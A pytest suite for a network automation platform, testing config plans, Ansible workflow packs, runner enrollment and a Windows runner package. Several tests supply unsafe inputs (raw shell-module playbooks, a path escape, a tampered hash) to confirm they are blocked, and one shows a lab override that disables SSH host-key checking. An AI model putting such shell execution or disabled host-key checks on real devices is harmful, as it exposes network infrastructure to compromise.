def test_template_artifact_endpoint_returns_jinja_body(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)

    response = TestClient(api.app).get("/api/templates/arista/add_vlan")
    data = response.json()

    assert response.status_code == 200
    assert Path(data["path"]).parts[-3:] == ("templates", "arista", "add_vlan.j2")
    assert "vlan {{ vlan.id }}" in data["body"]


def test_desired_state_catalog_and_dynamic_plans(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    catalog = client.get("/api/desired-state/catalog")
    ids = {item["id"] for item in catalog.json()["change_types"]}

    assert catalog.status_code == 200
    assert {"add_vlan", "interface_config", "bgp_neighbor", "routing_redistribution", "acl_rule", "site_device_intent", "os_upgrade"}.issubset(ids)

    interface_plan = client.post(
        "/api/desired-state/plan",
        json={
            "change_type": "interface_config",
            "site": "store-1842",
            "device_id": "v2-store1",
            "requested_by": "unit",
            "values": {
                "interface": "Ethernet1",
                "description": "UNIT_TEST",
                "mode": "access",
                "access_vlan": 90,
                "enabled": True,
            },
        },
    )
    bgp_plan = client.post(
        "/api/desired-state/plan",
        json={
            "change_type": "bgp_neighbor",
            "site": "store-1842",
            "device_id": "v2-store1",
            "requested_by": "unit",
            "values": {"asn": 65001, "neighbor": "10.255.0.2", "remote_as": 65002, "description": "UNIT_PEER"},
        },
    )
    acl_plan = client.post(
        "/api/desired-state/plan",
        json={
            "change_type": "acl_rule",
            "site": "store-1842",
            "device_id": "v2-store1",
            "requested_by": "unit",
            "values": {"acl_name": "UNIT_ACL", "sequence": 10, "action": "permit", "protocol": "ip", "source": "any", "destination": "any"},
        },
    )
    site_plan = client.post(
        "/api/desired-state/plan",
        json={
            "change_type": "site_device_intent",
            "site": "store-1842",
            "device_id": "v2-store4",
            "requested_by": "unit",
            "values": {"new_device_id": "v2-store4", "role": "access-switch", "platform": "arista_eos", "management_ip": "172.100.1.44"},
        },
    )
    os_plan = client.post(
        "/api/desired-state/plan",
        json={
            "change_type": "os_upgrade",
            "site": "store-1842",
            "device_id": "v2-store1",
            "requested_by": "unit",
            "values": {
                "image": "EOS-4.35.1F.swi",
                "target_version": "4.35.1F",
                "md5": "0123456789abcdef0123456789abcdef",
                "image_uri": "https://artifacts.example/EOS-4.35.1F.swi",
                "rollback_image": "EOS-4.34.3M.swi",
                "maintenance_window": "Sunday 02:00-04:00 UTC",
                "canary_size": 1,
                "batch_size": 4,
            },
        },
    )

    assert interface_plan.status_code == 200
    assert interface_plan.json()["ok"] is True
    assert interface_plan.json()["plan"]["lab_write_supported"] is True
    assert "interface Ethernet1" in interface_plan.json()["pipeline"]["render"]["config"]
    assert bgp_plan.status_code == 200
    assert "router bgp 65001" in bgp_plan.json()["pipeline"]["render"]["config"]
    assert acl_plan.status_code == 200
    assert "ip access-list UNIT_ACL" in acl_plan.json()["pipeline"]["render"]["config"]
    assert site_plan.status_code == 200
    assert site_plan.json()["plan"]["lab_write_supported"] is False
    assert "Source-of-truth only intent" in site_plan.json()["pipeline"]["render"]["config"]
    assert os_plan.status_code == 200
    os_render = os_plan.json()["pipeline"]["render"]["config"]
    assert "boot system flash:EOS-4.35.1F.swi" in os_render
    assert "verify md5 EOS-4.35.1F.swi 0123456789abcdef0123456789abcdef" in os_render
    assert all(line.strip().lower() != "reload" for line in os_render.splitlines())
    assert os_plan.json()["plan"]["rollback"]["commands"].startswith("no boot system flash:EOS-4.35.1F.swi")

    blocked_os_plan = client.post(
        "/api/desired-state/plan",
        json={
            "change_type": "os_upgrade",
            "site": "store-1842",
            "device_id": "v2-store1",
            "requested_by": "unit",
            "values": {
                "image": "EOS-4.35.1F.swi",
                "target_version": "4.35.1F",
                "md5": "0123456789abcdef0123456789abcdef",
                "maintenance_window": "",
            },
        },
    )
    assert blocked_os_plan.status_code == 400


def test_repeated_desired_state_plans_keep_immutable_change_identity(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    def plan_ntp(servers: list[str]):
        return client.post(
            "/api/desired-state/plan",
            json={
                "change_type": "ntp_standardize",
                "site": "store-1842",
                "device_id": "v2-store1",
                "requested_by": "unit",
                "values": {"servers": servers},
            },
        )

    first = plan_ntp(["10.42.0.10"])
    second = plan_ntp(["10.42.0.11"])

    assert first.status_code == 200
    assert second.status_code == 200
    first_body = first.json()
    second_body = second.json()
    assert first_body["change"]["id"] != second_body["change"]["id"]
    assert first_body["intent_path"] != second_body["intent_path"]
    assert first_body["plan"]["slug"] != second_body["plan"]["slug"]

    first_intent = load_intent(Path(first_body["intent_path"]))
    second_intent = load_intent(Path(second_body["intent_path"]))
    assert first_intent.ntp.servers == ["10.42.0.10"]
    assert second_intent.ntp.servers == ["10.42.0.11"]
    assert first_intent.metadata.change_instance_id
    assert second_intent.metadata.change_instance_id


def test_workflow_pack_catalog_references_supported_native_change_types():
    from netcode.workflow_packs import workflow_pack_catalog

    catalog = workflow_pack_catalog()
    packs = {pack["id"]: pack for pack in catalog["packs"]}

    assert catalog["ok"] is True
    assert catalog["catalog_version"] == "netcode-native-workflow-packs.v1"
    assert set(packs) == {
        "golden-baseline-standardization",
        "branch-site-onboarding",
        "controlled-routing-acl-update",
        "eos-os-upgrade",
    }
    assert catalog["safety"] == {
        "credentials": "runner-local",
        "writes": "gated",
        "diagnostics": "read-only",
    }
    for pack in packs.values():
        assert pack["status"] == "ready"
        assert pack["missing_change_types"] == []
        assert pack["native_engine"] is True
        assert pack["ansible_backend"] is False
        assert pack["diagnostics_handoff"] is True
        assert pack["production_writes"] == "locked_until_approved"


def test_workflow_pack_catalog_endpoint(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)

    response = TestClient(api.app).get("/api/workflow-packs")
    data = response.json()

    assert response.status_code == 200
    assert data["ok"] is True
    assert {pack["id"] for pack in data["packs"]} == {
        "golden-baseline-standardization",
        "branch-site-onboarding",
        "controlled-routing-acl-update",
        "eos-os-upgrade",
    }
    assert all(pack["status"] == "ready" for pack in data["packs"])


def test_ansible_pack_plan_requires_rollback_for_apply(tmp_path: Path):
    from netcode.ansible_backend import build_ansible_pack_plan

    playbook = tmp_path / "site.yml"
    playbook.write_text(
        """
- hosts: all
  gather_facts: false
  tasks:
    - name: Configure NTP
      arista.eos.eos_config:
        lines:
          - ntp server 10.10.10.20
""",
        encoding="utf-8",
    )

    plan = build_ansible_pack_plan(tmp_path, playbook_path="site.yml", mode="apply", targets=["Access-SW-01"])

    assert plan["ok"] is False
    assert plan["status"] == "blocked"
    assert "rollback_playbook_required" in plan["blockers"]
    assert plan["execution"] == {
        "location": "runner",
        "runner_local_inventory": True,
        "cloud_device_access": False,
        "credentials_leave_runner": False,
        "check_mode_first": True,
    }


def test_ansible_pack_plan_blocks_high_risk_modules_without_cloud_execution(tmp_path: Path):
    from netcode.ansible_backend import build_ansible_pack_plan

    playbook = tmp_path / "site.yml"
    rollback = tmp_path / "rollback.yml"
    playbook.write_text(
        """
- hosts: all
  tasks:
    - name: High risk operational shell
      shell: show version
""",
        encoding="utf-8",
    )
    rollback.write_text(
        """
- hosts: all
  tasks:
    - name: Rollback placeholder
      debug:
        msg: rollback reviewed
""",
        encoding="utf-8",
    )

    plan = build_ansible_pack_plan(
        tmp_path,
        playbook_path="site.yml",
        rollback_playbook_path="rollback.yml",
        mode="canary",
        targets=["Core-RTR-02"],
    )

    assert plan["ok"] is False
    assert plan["status"] == "blocked"
    assert plan["playbook"]["high_risk_modules"] == ["shell"]
    assert "high_risk_modules_forbidden" in plan["blockers"]
    assert plan["execution"]["location"] == "runner"
    assert plan["execution"]["cloud_device_access"] is False


def test_ansible_pack_plan_rejects_path_escape(tmp_path: Path):
    from netcode.ansible_backend import build_ansible_pack_plan

    outside = tmp_path.parent / "outside.yml"
    outside.write_text("- hosts: all\n  tasks: []\n", encoding="utf-8")

    try:
        build_ansible_pack_plan(tmp_path, playbook_path=str(outside))
    except ValueError as exc:
        assert "inside the Netcode workspace" in str(exc)
    else:
        raise AssertionError("path escape must be rejected")


def test_ansible_pack_plan_endpoint(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    playbook = tmp_path / "playbooks" / "ntp.yml"
    playbook.parent.mkdir(parents=True, exist_ok=True)
    playbook.write_text(
        """
- hosts: all
  tasks:
    - name: Preview approved NTP
      debug:
        msg: ntp server 10.10.10.20
""",
        encoding="utf-8",
    )

    response = TestClient(api.app).post(
        "/api/workflow-packs/ansible/plan",
        json={"playbook_path": "playbooks/ntp.yml", "targets": ["Access-SW-01"], "mode": "check"},
    )
    data = response.json()

    assert response.status_code == 200
    assert data["ok"] is True
    assert data["backend"] == "ansible"
    assert data["execution"]["runner_local_inventory"] is True
    assert data["execution"]["credentials_leave_runner"] is False


def test_ansible_pack_run_blocks_without_runner_before_creating_change(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("NETCODE_EXECUTION", "local")
    playbook = tmp_path / "playbooks" / "ntp.yml"
    playbook.parent.mkdir(parents=True, exist_ok=True)
    playbook.write_text(
        """
- hosts: all
  tasks:
    - name: Preview approved NTP
      debug:
        msg: ntp server 10.10.10.20
""",
        encoding="utf-8",
    )

    response = TestClient(api.app).post(
        "/api/workflow-packs/ansible/run",
        json={"playbook_path": "playbooks/ntp.yml", "targets": ["Access-SW-01"], "mode": "check"},
    )
    data = response.json()

    assert response.status_code == 200
    assert data["ok"] is False
    assert data["queued"] is False
    assert "runner-only" in data["message"]
    assert PlatformStore(WorkspacePaths(tmp_path)).list_changes() == []


def test_ansible_pack_run_queues_check_on_runner_without_credentials(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("NETCODE_EXECUTION", "runner")
    monkeypatch.setenv("NETCODE_RUNNER_POOL", "pilot")
    playbook = tmp_path / "playbooks" / "ntp.yml"
    playbook.parent.mkdir(parents=True, exist_ok=True)
    playbook.write_text(
        """
- hosts: all
  tasks:
    - name: Preview approved NTP
      debug:
        msg: ntp server 10.10.10.20
""",
        encoding="utf-8",
    )

    response = TestClient(api.app).post(
        "/api/workflow-packs/ansible/run",
        json={"playbook_path": "playbooks/ntp.yml", "targets": ["Access-SW-01"], "mode": "check"},
    )
    data = response.json()

    assert response.status_code == 200
    assert data["ok"] is True
    assert data["queued"] is True
    assert data["job"]["action"] == "ansible_check"
    assert data["job"]["pool"] == "pilot"
    payload = data["job"]["payload"]
    assert payload["action"] == "ansible_pack"
    assert payload["mode"] == "check"
    assert payload["targets"] == ["Access-SW-01"]
    assert "Preview approved NTP" in payload["playbook_content"]
    assert len(payload["playbook_sha256"]) == 64
    serialized = json.dumps(payload).lower()
    assert "password" not in serialized
    assert "secret" not in serialized
    assert data["change"]["workflow_state"] == "validated"


def test_ansible_runner_check_result_advances_to_dry_run_passed(tmp_path: Path, monkeypatch):
    import hmac as hmac_mod

    from netcode.runner_hub import canonical_json

    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("NETCODE_EXECUTION", "runner")
    monkeypatch.setenv("NETCODE_RUNNER_POOL", "pilot")
    playbook = tmp_path / "playbooks" / "show.yml"
    playbook.parent.mkdir(parents=True)
    playbook.write_text(
        "- hosts: all\n  tasks:\n    - debug:\n        msg: reviewed\n",
        encoding="utf-8",
    )
    client = TestClient(api.app)
    join = client.post("/api/runners/join-token", json={"pool": "pilot"}).json()
    enrolled = client.post(
        "/api/runner/enroll",
        json={"join_token": join["join_token"], "name": "unit-runner"},
    ).json()
    auth = {"Authorization": f"Bearer {enrolled['runner_token']}"}

    queued = client.post(
        "/api/workflow-packs/ansible/run",
        json={
            "playbook_path": "playbooks/show.yml",
            "targets": ["Access-SW-01"],
            "mode": "check",
        },
    ).json()
    claimed = client.post(
        "/api/runner/poll", json={"wait_seconds": 0}, headers=auth
    ).json()["job"]
    result = {
        "ok": True,
        "status": "pass",
        "action": "ansible_pack",
        "mode": "check",
        "message": "Reviewed playbook check passed.",
    }
    signature = hmac_mod.new(
        enrolled["hmac_secret"].encode(),
        canonical_json(result).encode(),
        hashlib.sha256,
    ).hexdigest()

    accepted = client.post(
        f"/api/runner/jobs/{claimed['id']}/result",
        json={"result": result, "signature": signature, "lease_token": claimed["lease_token"]},
        headers=auth,
    ).json()

    assert claimed["id"] == queued["job"]["id"]
    assert accepted["ok"] is True
    assert accepted["workflow_state"] == "dry_run_passed"
    change = PlatformStore(WorkspacePaths(tmp_path)).get_change(queued["change"]["id"])
    assert change.workflow_state == "dry_run_passed"


def test_ansible_pack_run_apply_requires_approved_change(tmp_path: Path, monkeypatch):
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("NETCODE_EXECUTION", "runner")
    playbook = tmp_path / "playbooks" / "ntp.yml"
    rollback = tmp_path / "playbooks" / "rollback.yml"
    playbook.parent.mkdir(parents=True, exist_ok=True)
    playbook.write_text(
        """
- hosts: all
  tasks:
    - name: Configure NTP
      debug:
        msg: ntp server 10.10.10.20
""",
        encoding="utf-8",
    )
    rollback.write_text(
        """
- hosts: all
  tasks:
    - name: Roll back NTP
      debug:
        msg: rollback reviewed
""",
        encoding="utf-8",
    )
    change = PlatformStore(paths).create_change(playbook, "Access-SW-01")

    response = TestClient(api.app).post(
        "/api/workflow-packs/ansible/run",
        json={
            "playbook_path": "playbooks/ntp.yml",
            "rollback_playbook_path": "playbooks/rollback.yml",
            "targets": ["Access-SW-01"],
            "mode": "apply",
            "change_id": change.id,
        },
    )
    data = response.json()

    assert response.status_code == 200
    assert data["ok"] is False
    assert data["queued"] is False
    assert "Approval required" in data["message"]
    assert PlatformStore(paths).get_change(change.id).workflow_state == "draft"


def test_runner_ansible_pack_reaudits_locally_and_uses_generated_inventory(tmp_path: Path, monkeypatch):
    from netcode import runner_agent
    from netcode.yamlio import read_yaml

    workspace = tmp_path / "workspace"
    workspace.mkdir()
    playbook = workspace / "playbooks" / "ntp.yml"
    playbook.parent.mkdir(parents=True)
    playbook.write_text(
        """
- hosts: all
  tasks:
    - name: Preview approved NTP
      debug:
        msg: ntp server 10.10.10.20
""",
        encoding="utf-8",
    )
    inventory_file = tmp_path / "runner-inventory.yaml"
    write_yaml(
        inventory_file,
        {
            "devices": [
                {
                    "id": "Access-SW-01",
                    "hostname": "Access-SW-01",
                    "host": "192.0.2.10",
                    "platform": "arista_eos",
                    "username": "admin",
                    "password": "local-only",
                    "port": 22,
                }
            ]
        },
    )
    monkeypatch.setattr(runner_agent, "INVENTORY_FILE", inventory_file)
    monkeypatch.setattr("shutil.which", lambda binary: "/usr/bin/ansible-playbook" if binary == "ansible-playbook" else None)
    captured: dict[str, object] = {}

    class Completed:
        returncode = 0
        stdout = "PLAY RECAP ok=1"
        stderr = ""

    def fake_run(command, **kwargs):
        captured["command"] = command
        captured["kwargs"] = kwargs
        captured["playbook"] = Path(command[1]).read_text(encoding="utf-8")
        inventory_path = Path(command[command.index("--inventory") + 1])
        captured["inventory"] = read_yaml(inventory_path)
        return Completed()

    monkeypatch.setattr(subprocess, "run", fake_run)

    result = runner_agent._execute_ansible_pack(
        {
            "mode": "check",
            "playbook_name": "ntp.yml",
            "playbook_content": playbook.read_text(encoding="utf-8"),
            "playbook_sha256": hashlib.sha256(
                playbook.read_text(encoding="utf-8").encode("utf-8")
            ).hexdigest(),
            "targets": ["Access-SW-01"],
        }
    )

    assert result["ok"] is True
    assert result["status"] == "pass"
    command = captured["command"]
    assert isinstance(command, list)
    assert "--check" in command
    assert "--diff" in command
    assert Path(captured["kwargs"]["cwd"]).name.startswith("netcode-ansible-")
    assert captured["kwargs"].get("shell") is not True
    assert captured["kwargs"]["env"]["ANSIBLE_HOST_KEY_CHECKING"] == "True"
    assert captured["kwargs"]["env"]["ANSIBLE_PARAMIKO_HOST_KEY_CHECKING"] == "True"
    assert captured["kwargs"]["env"]["ANSIBLE_PARAMIKO_HOST_KEY_AUTO_ADD"] == "False"
    assert "Preview approved NTP" in str(captured["playbook"])
    generated_inventory = captured["inventory"]
    assert generated_inventory["all"]["hosts"]["Access-SW-01"]["ansible_host"] == "192.0.2.10"
    assert generated_inventory["all"]["hosts"]["Access-SW-01"]["ansible_password"] == "local-only"
    serialized_result = json.dumps(result).lower()
    assert "local-only" not in serialized_result
    assert result["evidence"]["credentials_leave_runner"] is False
    assert result["evidence"]["playbook_integrity_verified"] is True


def test_runner_ansible_host_key_override_is_explicit_and_lab_scoped(tmp_path: Path, monkeypatch):
    from netcode import runner_agent

    monkeypatch.delenv("NETCODE_ANSIBLE_HOST_KEY_CHECKING", raising=False)
    assert runner_agent._ansible_host_key_checking_enabled() is True
    strict_env = runner_agent._ansible_subprocess_env()
    assert strict_env["ANSIBLE_PARAMIKO_HOST_KEY_CHECKING"] == "True"
    assert strict_env["ANSIBLE_PARAMIKO_HOST_KEY_AUTO_ADD"] == "False"

    monkeypatch.setenv("NETCODE_ANSIBLE_HOST_KEY_CHECKING", "false")
    assert runner_agent._ansible_host_key_checking_enabled() is False
    lab_env = runner_agent._ansible_subprocess_env(tmp_path)
    assert lab_env["ANSIBLE_PARAMIKO_HOST_KEY_CHECKING"] == "False"
    assert lab_env["ANSIBLE_PARAMIKO_HOST_KEY_AUTO_ADD"] == "True"
    assert lab_env["HOME"] == str(tmp_path / "ansible-home")
    assert lab_env["ANSIBLE_PERSISTENT_CONTROL_PATH_DIR"] == str(tmp_path / "ansible-pc")


def test_runner_ansible_lab_override_is_written_only_to_local_inventory(tmp_path: Path, monkeypatch):
    from netcode import runner_agent
    from netcode.yamlio import read_yaml

    device = Device(
        id="lab-edge-01",
        host="192.0.2.20",
        platform="arista_eos",
        username="local-user",
        password="local-password",
        port=22,
        hostname="lab-edge-01",
        site="lab",
        groups=(),
    )
    destination = tmp_path / "inventory.yaml"
    monkeypatch.setenv("NETCODE_ANSIBLE_HOST_KEY_CHECKING", "false")

    runner_agent._write_ansible_inventory([device], destination)

    host = read_yaml(destination)["all"]["hosts"]["lab-edge-01"]
    assert host["ansible_host_key_checking"] is False
    assert host["ansible_ssh_host_key_checking"] is False


def test_git_setup_explicit_blank_uses_local_community_repository(tmp_path: Path, monkeypatch):
    p = WorkspacePaths(tmp_path)
    init_workspace(p)
    write_yaml(
        p.state / "ui_config.yaml",
        {"git": {"repo_url": "https://example.invalid/configured.git"}},
    )
    monkeypatch.chdir(tmp_path)

    response = TestClient(api.app).post(
        "/api/git/setup", json={"repo_url": "", "branch": "main"}
    )

    assert response.status_code == 200
    assert response.json()["ok"] is True
    remotes = subprocess.run(
        ["git", "remote"],
        cwd=p.git_workspace,
        capture_output=True,
        text=True,
        check=True,
    )
    assert remotes.stdout.strip() == ""


def test_git_setup_preserves_existing_branch_tip(tmp_path: Path):
    from netcode.gitflow import setup_git_workspace

    history = tmp_path / "change-history"
    initialized = setup_git_workspace(history, branch="main")
    assert initialized["ok"] is True
    main_commit = subprocess.run(
        ["git", "rev-parse", "HEAD"],
        cwd=history,
        capture_output=True,
        text=True,
        check=True,
    ).stdout.strip()
    subprocess.run(
        ["git", "checkout", "-b", "change/test"],
        cwd=history,
        capture_output=True,
        text=True,
        check=True,
    )
    (history / "changes" / "test").mkdir(parents=True)
    (history / "changes" / "test" / "change-record.json").write_text(
        '{"change_id": "test"}\n',
        encoding="utf-8",
    )
    subprocess.run(
        [
            "git",
            "-c",
            "user.email=netcode@localhost",
            "-c",
            "user.name=Netcode",
            "-c",
            "commit.gpgsign=false",
            "add",
            "--",
            "changes/test/change-record.json",
        ],
        cwd=history,
        capture_output=True,
        text=True,
        check=True,
    )
    subprocess.run(
        [
            "git",
            "-c",
            "user.email=netcode@localhost",
            "-c",
            "user.name=Netcode",
            "-c",
            "commit.gpgsign=false",
            "commit",
            "-m",
            "Add test change",
        ],
        cwd=history,
        capture_output=True,
        text=True,
        check=True,
    )

    reconnected = setup_git_workspace(history, branch="main")
    current_commit = subprocess.run(
        ["git", "rev-parse", "HEAD"],
        cwd=history,
        capture_output=True,
        text=True,
        check=True,
    ).stdout.strip()

    assert reconnected["ok"] is True
    assert reconnected["status"]["branch"] == "main"
    assert current_commit == main_commit


def test_runner_ansible_pack_rejects_tampered_transport_content(tmp_path: Path, monkeypatch):
    from netcode import runner_agent

    inventory_file = tmp_path / "runner-inventory.yaml"
    write_yaml(inventory_file, {"devices": []})
    monkeypatch.setattr(runner_agent, "INVENTORY_FILE", inventory_file)

    result = runner_agent._execute_ansible_pack(
        {
            "mode": "check",
            "playbook_name": "show.yml",
            "playbook_content": "- hosts: all\n  tasks: []\n",
            "playbook_sha256": "0" * 64,
            "targets": ["Access-SW-01"],
        }
    )

    assert result["ok"] is False
    assert "integrity verification failed" in result["message"]


def test_runner_ansible_pack_reaudit_blocks_raw_shell_module(tmp_path: Path, monkeypatch):
    from netcode import runner_agent

    inventory_file = tmp_path / "runner-inventory.yaml"
    write_yaml(
        inventory_file,
        {
            "devices": [
                {
                    "id": "Access-SW-01",
                    "host": "192.0.2.10",
                    "platform": "arista_eos",
                    "username": "runner-local",
                    "password": "runner-local-secret",
                }
            ]
        },
    )
    monkeypatch.setattr(runner_agent, "INVENTORY_FILE", inventory_file)
    monkeypatch.setattr("shutil.which", lambda binary: "/usr/bin/ansible-playbook")
    playbook = """- hosts: all
  tasks:
    - name: Unsafe arbitrary shell
      ansible.builtin.shell: id
"""

    result = runner_agent._execute_ansible_pack(
        {
            "mode": "check",
            "playbook_name": "unsafe.yml",
            "playbook_content": playbook,
            "playbook_sha256": hashlib.sha256(playbook.encode()).hexdigest(),
            "targets": ["Access-SW-01"],
        }
    )

    assert result["ok"] is False
    assert result["message"] == "Local runner Ansible audit blocked execution."
    assert "high_risk_modules_forbidden" in result["evidence"]["plan"]["blockers"]


def test_local_connector_capabilities_are_secret_free_and_open_no_device_sessions(tmp_path: Path, monkeypatch):
    from netcode import runner_agent

    inventory_file = tmp_path / "runner-inventory.yaml"
    write_yaml(
        inventory_file,
        {
            "defaults": {"username": "local-user", "password": "local-secret"},
            "devices": [
                {
                    "id": "edge-01",
                    "host": "192.0.2.10",
                    "platform": "arista_eos",
                }
            ],
        },
    )
    monkeypatch.setattr(runner_agent, "INVENTORY_FILE", inventory_file)
    monkeypatch.setattr(
        "shutil.which",
        lambda binary: f"/usr/bin/{binary}" if binary in {"ansible-playbook", "ansible-galaxy"} else None,
    )

    class Completed:
        returncode = 0
        stdout = json.dumps(
            {
                "/collections": {
                    "arista.eos": {"version": "10.0.0"},
                    "cisco.ios": {"version": "9.1.0"},
                }
            }
        )
        stderr = ""

    monkeypatch.setattr("subprocess.run", lambda *args, **kwargs: Completed())

    result = runner_agent._execute_read_inner("connector_capabilities", {})
    serialized = json.dumps(result).lower()

    assert result["ok"] is True
    assert result["connector"]["device_connections_opened"] == 0
    assert result["inventory"]["device_count"] == 1
    assert result["ansible"]["installed"] is True
    assert next(item for item in result["ansible"]["collections"] if item["name"] == "arista.eos")["installed"] is True
    assert result["safety"] == {
        "device_writes": "none",
        "credentials_returned": False,
        "device_connections_opened": 0,
    }
    assert "local-secret" not in serialized
    assert "local-user" not in serialized


def test_local_connector_readiness_targets_selected_connector(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)
    join = client.post("/api/runners/join-token", json={"pool": "pilot"}).json()
    enrolled = client.post(
        "/api/runner/enroll",
        json={"join_token": join["join_token"], "name": "branch-connector"},
    ).json()
    PlatformStore(WorkspacePaths(tmp_path)).touch_runner(enrolled["runner_id"], status="online")
    captured: dict[str, object] = {}

    def fake_read(paths, action, payload, org_id, timeout=60.0, *, change_id=None, target_runner_id=None):
        captured.update({
            "action": action,
            "payload": payload,
            "org_id": org_id,
            "target_runner_id": target_runner_id,
        })
        return {
            "ok": True,
            "connector": {"device_connections_opened": 0},
            "safety": {"credentials_returned": False, "device_connections_opened": 0},
        }

    monkeypatch.setattr(api, "_runner_read", fake_read)
    response = client.get(f"/api/local-connectors/{enrolled['runner_id']}/readiness")
    data = response.json()

    assert response.status_code == 200
    assert data["ok"] is True
    assert captured["action"] == "connector_capabilities"
    assert captured["payload"] == {}
    assert captured["target_runner_id"] == enrolled["runner_id"]
    assert data["connector"]["name"] == "branch-connector"


def test_guided_ansible_builder_creates_yaml_without_python(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)

    response = TestClient(api.app).post(
        "/api/workflow-packs/ansible/generate",
        json={
            "name": "Check edge BGP",
            "platform": "arista_eos",
            "operation": "show",
            "commands": ["show ip bgp summary"],
            "targets": ["v2-store1"],
        },
    )
    data = response.json()

    assert response.status_code == 200
    assert data["ok"] is True
    assert "arista.eos.eos_command" in data["playbook_yaml"]
    assert "python" not in data["playbook_yaml"].lower()
    assert data["plan"]["ok"] is True
    assert data["rollback_playbook_path"] == ""


def test_guided_ansible_config_requires_and_generates_rollback(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    blocked = client.post(
        "/api/workflow-packs/ansible/generate",
        json={
            "name": "Standardize NTP",
            "platform": "cisco_xe",
            "operation": "config",
            "commands": ["ntp server 10.10.10.20"],
        },
    )
    created = client.post(
        "/api/workflow-packs/ansible/generate",
        json={
            "name": "Standardize NTP",
            "platform": "cisco_xe",
            "operation": "config",
            "commands": ["ntp server 10.10.10.20"],
            "rollback_commands": ["no ntp server 10.10.10.20"],
            "targets": ["branch-edge-01"],
        },
    )

    assert blocked.status_code == 400
    assert "rollback commands" in blocked.json()["detail"]
    assert created.status_code == 200
    assert "cisco.ios.ios_config" in created.json()["playbook_yaml"]
    assert "no ntp server" in created.json()["rollback_yaml"]


def test_shell_desktop_profile_is_native_and_secret_free():
    from netcode.shell_desktop import build_desktop_shell_profile

    profile = build_desktop_shell_profile("https://netcode.example.com", runner_pool="pilot")
    serialized = json.dumps(profile).lower()

    assert profile["client"]["kind"] == "native-desktop"
    assert profile["client"]["browser_based"] is False
    assert profile["transport"]["shell_websocket_base_url"] == "wss://netcode.example.com"
    assert profile["capabilities"]["full_human_cli"] is True
    assert profile["boundaries"]["rez_diagnostics"] == "read-only runner actions only"
    assert profile["control_plane"]["device_credentials"] == "never_stored"
    assert "password" not in serialized
    assert "runner_token" not in serialized
    assert "private_key" not in serialized


def test_shell_open_defaults_to_full_live_mode(tmp_path: Path, monkeypatch):
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    monkeypatch.chdir(tmp_path)

    response = TestClient(api.app).post("/api/shell/open", json={"device_id": "v2-store1"})
    body = response.json()

    assert response.status_code == 200
    assert body["state"]["mode"] == "direct"
    assert body["state"]["guard_enabled"] is False
    assert "Full live shell open" in body["message"]


def test_shell_desktop_profile_endpoint(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)

    response = TestClient(api.app).get("/api/shell/desktop/profile")
    data = response.json()

    assert response.status_code == 200
    assert data["profile_version"] == "netcode-shell-desktop.v1"
    assert data["client"]["browser_based"] is False
    assert data["transport"]["open_session"].endswith("/api/shell/open")
    assert data["boundaries"]["credentials"] == "runner-local inventory only"


def test_windows_runner_package_contains_install_scripts_and_no_secrets():
    from netcode.windows_runner_package import build_windows_runner_package

    package = build_windows_runner_package("https://netcode.example.com", runner_pool="pilot")
    with zipfile.ZipFile(BytesIO(package), "r") as archive:
        names = set(archive.namelist())
        combined = "\n".join(
            archive.read(name).decode("utf-8")
            for name in names
            if not name.startswith(("runner-source/", "rez-runtime/"))
        )

    assert {
        "README.md",
        "preflight.ps1",
        "install-runner.ps1",
        "start-runner.ps1",
        "open-connector.ps1",
        "diagnose-runner.ps1",
        "uninstall-runner.ps1",
        "build-windows-executable.ps1",
        "windows-entrypoint.py",
        "package-info.json",
        "SHA256SUMS.txt",
        "netcode-shell-profile.json",
        "rez-runtime/drivers/collector.py",
        "rez-runtime/device_state_model.py",
        "runner-source/pyproject.toml",
        "runner-source/netcode/runner_agent.py",
        "runner-source/netcode/windows_connector_control.py",
    }.issubset(names)
    assert "https://netcode.example.com" in combined
    assert "wss://netcode.example.com" in combined
    assert "runner_token" not in combined
    assert "hmac_secret" not in combined
    assert "<single-use-token>" in combined
    assert "replace-me" not in combined
    assert "NETCODE_REZ_ROOT" in combined
    assert "discover local inventory" in combined
    assert "open-connector.ps1" in combined
    assert "inventory-import $InventoryPath" not in combined
    assert "Nuitka Commercial" in combined
    assert "PyInstaller" not in combined
    assert 'Join-Path $PSScriptRoot "runner-source"' in combined
    assert 'Join-Path $env:ProgramData "Rezonance\\LocalConnector"' in combined
    assert 'New-ScheduledTaskPrincipal -UserId "SYSTEM"' in combined
    assert "NETCODE_RUNNER_HOME" in combined
    assert "machine-scoped DPAPI" in combined
    assert "AllowInsecureHttpForLab" in combined
    assert "ControlPlaneUrl" in combined
    assert '[string]$JoinToken = ""' in combined
    assert "Preserved existing protected connector identity." in combined
    assert "Enrollment is required. The Local Connector window will request" in combined
    assert 'Get-Process -Name "RezonanceLocalConnector"' in combined
    assert "Get-CimInstance Win32_Process" in combined
    assert '$ConnectorProcess.SessionId -eq 0' in combined
    assert '$ParentProcess.SessionId -eq 0' in combined
    assert 'Wait-Process -Id $ConnectorProcess.Id -Timeout 15' in combined
